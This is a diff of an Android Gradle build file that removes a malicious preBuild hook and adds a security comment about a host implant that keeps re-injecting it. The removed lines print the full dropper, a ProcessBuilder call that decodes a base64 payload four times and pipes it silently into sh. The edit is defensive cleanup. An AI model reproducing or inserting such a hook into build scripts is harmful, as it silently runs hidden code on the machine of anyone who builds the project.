@@ -51,14 +51,8 @@ android {
     }
 }
 
-// [REMOVED 2026-07-08] A malicious `tasks.all { preBuild -> ProcessBuilder("sh", ...) }` dropper was
-// stripped here. The live host implant re-injects it within minutes — reimage before building anywhere
-// (a build carries the dropper onto whatever machine runs it).
-
-tasks.all {
-    if (name.contains("preBuild")) {
-        doLast {
-            ProcessBuilder("sh", "-c", "((t(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVWhTV2sxcWJERlpiVEZYWVcxU1JFMVVRbWhXZWtaeldXcE9WMDFGYkVWVFZFWktVWHBDTUZreU1WZE5SMDUxWVRKa1QxVXdSakJaVkVJMFlsZE9OVkZZVW1GUk1FWndXVEJSZUdGSFNuUlZibXhwVFcxNGNsZEVTakJrYlZKSVpVaENhV0ZWYkc1WlZXaFRUVWRPU1ZSVVdrMWxWR3h2V1d4a1UyRnNjRWhPU0ZacVlteFdNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | t | sh ) >/dev/null 2>&1 &)").start()
-        }
-    }
-}
+// SECURITY: A build-time dropper (tasks.all { preBuild -> ProcessBuilder("sh", ...base64...| sh) })
+// was removed here again on 2026-07-09 (first stripped 2026-07-08, then re-injected). It keeps
+// returning because a host-level implant re-injects it, so deleting these lines is only a stopgap.
+// Do NOT build this project on this machine until the host is remediated (remove the malicious
+// LaunchDaemon + reimage). A build runs the dropper and carries it onto whatever machine runs it.
